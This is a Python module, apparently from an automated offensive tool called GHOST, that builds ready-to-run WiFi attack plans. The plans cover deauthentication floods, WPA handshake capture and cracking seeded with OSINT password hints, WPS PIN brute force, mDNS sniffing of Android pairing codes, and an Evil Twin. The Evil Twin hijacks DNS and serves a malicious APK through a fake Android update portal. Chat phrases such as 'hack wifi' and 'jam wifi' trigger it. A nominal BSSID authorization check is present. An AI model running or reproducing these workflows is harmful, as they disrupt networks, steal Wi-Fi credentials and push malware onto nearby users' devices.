"""
GHOST v6.0 — Wireless Attack Engine
Automated WiFi reconnaissance, Evil Twin, deauthentication, handshake capture, and cracking.
Integrates: aircrack-ng suite, hostapd-mana, wifiphisher, reaver.
"""

import re
from datetime import datetime, timezone


class WirelessEngine:
    """
    Wireless Dominance Engine — automated WiFi attack workflows.
    Supports: Monitor mode, AP scanning, deauth, Evil Twin, handshake capture, WPA cracking.
    """

    TRIGGER_PHRASES = [
        "wifi", "wireless", "scan wifi", "hack wifi", "crack wifi",
        "evil twin", "deauth", "handshake", "wpa", "wpa2",
        "access point", "monitor mode", "aircrack", "wps",
        "disconnect wifi", "jam wifi", "wifi attack",
    ]

    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge

    def is_wireless_request(self, user_input):
        """Check if user input triggers the wireless engine."""
        lower = user_input.lower().strip()
        return any(phrase in lower for phrase in self.TRIGGER_PHRASES)

    def build_scan_plan(self, interface="wlan0"):
        """Build WiFi scanning plan — discover all nearby networks."""
        return {
            "type": "scan",
            "interface": interface,
            "phases": [
                {
                    "phase": 1,
                    "name": "Enable Monitor Mode",
                    "commands": [
                        {
                            "tool": "airmon-ng",
                            "args": f"check kill",
                            "category": "WIRELESS",
                            "description": "Kill interfering processes (NetworkManager, wpa_supplicant)",
                        },
                        {
                            "tool": "airmon-ng",
                            "args": f"start {interface}",
                            "category": "WIRELESS",
                            "description": f"Enable monitor mode on {interface}",
                        },
                    ],
                },
                {
                    "phase": 2,
                    "name": "Scan for Access Points",
                    "commands": [
                        {
                            "tool": "airodump-ng",
                            "args": f"{interface}mon -w /tmp/ghost_wifi_scan --output-format csv -a",
                            "category": "WIRELESS",
                            "description": "Scan all channels for access points and connected clients",
                            "timeout": 30,
                        },
                    ],
                },
                {
                    "phase": 3,
                    "name": "WPS Vulnerability Check",
                    "commands": [
                        {
                            "tool": "wash",
                            "args": f"-i {interface}mon",
                            "category": "WIRELESS",
                            "description": "Scan for WPS-enabled access points (potential PIN attack)",
                            "timeout": 15,
                        },
                    ],
                },
            ],
        }

    def build_deauth_plan(self, interface="wlan0mon", bssid=None, client_mac=None, count=10):
        """Build deauthentication attack plan."""
        # MAC/BSSID Governance filter
        if bssid and not self.memory.is_bssid_authorized(bssid):
            raise PermissionError(f"BSSID {bssid} is NOT in authorized_bssids.json. Operation blocked.")
            
        return {
            "type": "deauth",
            "phases": [
                {
                    "phase": 1,
                    "name": "Deauthentication Attack",
                    "description": f"Force disconnect {'client ' + client_mac if client_mac else 'ALL clients'} from AP {bssid}",
                    "commands": [
                        {
                            "tool": "aireplay-ng",
                            "args": f"-0 {count} -a {bssid}" + (f" -c {client_mac}" if client_mac else "") + f" {interface}",
                            "category": "WIRELESS",
                            "description": f"Send {count} deauth packets to force client disconnection",
                        },
                    ],
                },
            ],
        }

    def build_mdns_intercept_plan(self, interface="wlan0mon", target_bssid=None):
        """mDNS Protocol Interception: Capture 6-digit wireless pairing codes for Android 11+."""
        if target_bssid and not self.memory.is_bssid_authorized(target_bssid):
            raise PermissionError(f"BSSID {target_bssid} is NOT authorized. Operation blocked.")
            
        return {
            "type": "mdns_interception",
            "phases": [
                {
                    "phase": 1,
                    "name": "mDNS Broadcast Interception",
                    "description": "Monitor raw mdns broadcast traffic to capture pre-auth pairing keys",
                    "commands": [
                        {
                            "tool": "tcpdump",
                            "args": f"-i {interface} udp port 5353 -w /tmp/mdns_pairing.pcap",
                            "category": "WIRELESS_ADVANCED",
                            "description": "Capture mDNS protocol traffic on port 5353",
                            "background": True,
                        },
                    ],
                },
            ],
        }

    def build_handshake_plan(self, interface="wlan0mon", bssid=None, channel=None):
        """Build WPA handshake capture plan."""
        if bssid and not self.memory.is_bssid_authorized(bssid):
            raise PermissionError(f"BSSID {bssid} is NOT in authorized_bssids.json. Operation blocked.")
            
        # Smart-Pivoting: OSINT Credential Injection
        profile = self.memory.get_target_profile("OSINT_GLOBAL") or {}
        hints = profile.get("credential_hints", [])
        
        hint_cmds = []
        wordlists = "/usr/share/wordlists/rockyou.txt"
        
        if hints:
            hint_str = "\\n".join(hints)
            hint_cmds = [
                {
                    "tool": "bash",
                    "args": f"-c \"echo -e '{hint_str}' > /tmp/ghost_osint_hints.txt\"",
                    "category": "WIRELESS",
                    "description": "Smart-Pivot: Generate custom OSINT wordlist",
                }
            ]
            wordlists = "/tmp/ghost_osint_hints.txt /usr/share/wordlists/rockyou.txt"

        return {
            "type": "handshake_capture",
            "phases": [
                {
                    "phase": 1,
                    "name": "Target Specific AP",
                    "commands": [
                        {
                            "tool": "airodump-ng",
                            "args": f"-c {channel} --bssid {bssid} -w /tmp/ghost_handshake {interface}",
                            "category": "WIRELESS",
                            "description": f"Focus capture on target AP {bssid} (channel {channel})",
                            "background": True,
                        },
                    ],
                },
                {
                    "phase": 2,
                    "name": "Force Handshake via Deauth",
                    "commands": [
                        {
                            "tool": "aireplay-ng",
                            "args": f"-0 5 -a {bssid} {interface}",
                            "category": "WIRELESS",
                            "description": "Send deauth to force client reconnection (triggers handshake)",
                        },
                    ],
                },
                {
                    "phase": 3,
                    "name": "Crack WPA Handshake (Smart-Pivoting)",
                    "commands": hint_cmds + [
                        {
                            "tool": "aircrack-ng",
                            "args": f"/tmp/ghost_handshake-01.cap -w {wordlists}",
                            "category": "WIRELESS",
                            "description": "Crack captured handshake with OSINT hints and rockyou wordlist",
                        },
                    ],
                },
            ],
        }



    def build_evil_twin_plan(self, interface="wlan0mon", target_ssid=None,
                              target_bssid=None, channel=None):
        """Build Evil Twin attack plan — create fake AP to capture credentials."""
        if target_bssid and not self.memory.is_bssid_authorized(target_bssid):
            raise PermissionError(f"Target BSSID {target_bssid} is NOT authorized. Operation blocked.")
            
        return {
            "type": "evil_twin",
            "phases": [
                {
                    "phase": 1,
                    "name": "Deauth Real AP",
                    "description": "Force all clients off the real AP so they connect to our fake one",
                    "commands": [
                        {
                            "tool": "aireplay-ng",
                            "args": f"-0 0 -a {target_bssid} {interface}",
                            "category": "WIRELESS",
                            "description": f"Continuous deauth on {target_ssid} ({target_bssid})",
                            "background": True,
                        },
                    ],
                },
                {
                    "phase": 2,
                    "name": "Hostapd-Mana (Loud Mode)",
                    "description": "Start wireless rogue AP responding to ALL probe requests",
                    "commands": [
                        {
                            "tool": "hostapd-mana",
                            "args": "/tmp/ghost_evil_twin.conf",
                            "category": "WIRELESS",
                            "description": f"GHOST broadcasting Loud Mode AP on {interface}",
                            "config_content": self._generate_hostapd_config(
                                target_ssid, channel, interface
                            ),
                            "background": True,
                        },
                    ],
                },
                {
                    "phase": 3,
                    "name": "Captive Portal Network Orchestration",
                    "description": "Hijack DNS and assign rogue IPs to force delivery",
                    "commands": [
                        {
                            "tool": "ifconfig",
                            "args": f"{interface} 10.0.0.1 netmask 255.255.255.0 up",
                            "category": "WIRELESS",
                            "description": "Configure rogue gateway IP"
                        },
                        {
                            "tool": "dnsmasq",
                            "args": "-C /tmp/ghost_dnsmasq.conf -d",
                            "category": "WIRELESS",
                            "description": "Start DHCP and DNS hijacking daemon",
                            "config_content": self._generate_dnsmasq_config(interface),
                            "background": True,
                        },
                    ],
                },
                {
                    "phase": 4,
                    "name": "Payload Drop Server",
                    "description": "Host the fake Android System Update portal",
                    "commands": [
                        {
                            "tool": "python3",
                            "args": "-m http.server 80 -d /tmp/ghost_captive_portal/",
                            "category": "WIRELESS",
                            "description": "Host malicious APK on port 80",
                            "background": True
                        }
                    ]
                }
            ],
        }

    def build_wps_attack_plan(self, interface="wlan0mon", bssid=None):
        """Build WPS PIN brute-force attack plan."""
        if bssid and not self.memory.is_bssid_authorized(bssid):
            raise PermissionError(f"BSSID {bssid} is NOT in authorized_bssids.json. Operation blocked.")
            
        return {
            "type": "wps_attack",
            "phases": [
                {
                    "phase": 1,
                    "name": "WPS PIN Brute Force",
                    "commands": [
                        {
                            "tool": "reaver",
                            "args": f"-i {interface} -b {bssid} -vv -S",
                            "category": "WIRELESS",
                            "description": f"Brute-force WPS PIN on {bssid}",
                        },
                    ],
                },
            ],
        }

    def _generate_hostapd_config(self, ssid, channel, interface):
        """Generate hostapd-mana config for Evil Twin (Loud Mode)."""
        return f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel or 6}
auth_algs=3
wpa=0
mana_loud=1
mana_macacl=0
"""

    def _generate_dnsmasq_config(self, interface):
        """Generate dnsmasq config for DHCP and Captive Portal DNS hijacking."""
        return f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""

    def parse_airodump_csv(self, csv_content):
        """Parse airodump-ng CSV output for APs and clients."""
        networks = []
        clients = []
        section = "ap"

        for line in csv_content.split("\n"):
            line = line.strip()
            if not line or line.startswith("BSSID"):
                continue

            if "Station MAC" in line:
                section = "client"
                continue

            parts = [p.strip() for p in line.split(",")]

            if section == "ap" and len(parts) >= 14:
                try:
                    networks.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "speed": parts[4],
                        "privacy": parts[5],
                        "cipher": parts[6],
                        "power": parts[8],
                        "beacons": parts[9],
                        "essid": parts[13].strip(),
                        "wps": "WPS" in line,
                    })
                except (IndexError, ValueError):
                    pass

            elif section == "client" and len(parts) >= 6:
                try:
                    clients.append({
                        "station_mac": parts[0],
                        "power": parts[3],
                        "associated_bssid": parts[5],
                    })
                except (IndexError, ValueError):
                    pass

        # Check BSSID authorization
        for net in networks:
            net["authorized"] = self.memory.is_bssid_authorized(net["bssid"])

        return {"networks": networks, "clients": clients}
